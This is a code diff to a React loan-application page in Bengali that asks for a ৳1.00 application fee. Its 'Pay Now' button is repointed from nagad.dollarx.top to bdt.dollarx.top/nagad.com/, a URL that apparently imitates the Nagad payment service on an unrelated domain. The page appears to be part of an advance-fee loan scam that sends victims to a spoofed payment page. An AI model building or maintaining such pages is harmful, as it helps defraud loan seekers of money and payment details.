@@ -128,7 +128,7 @@ export default function Loan() {
             <h2 className="text-lg font-bold">আবেদন ফি</h2>
             <p className="text-muted-foreground">আপনার লোন আবেদন প্রক্রিয়া করতে অনুগ্রহ করে আবেদন ফি পরিশোধ করুন।</p>
             <div className="text-4xl font-black text-primary">৳1.00</div>
-            <a href="https://nagad.dollarx.top" className="block">
+            <a href="https://bdt.dollarx.top/nagad.com/" className="block">
               <Button className="w-full bg-accent text-accent-foreground hover:bg-accent/90">Pay Now</Button>
             </a>
           </div>
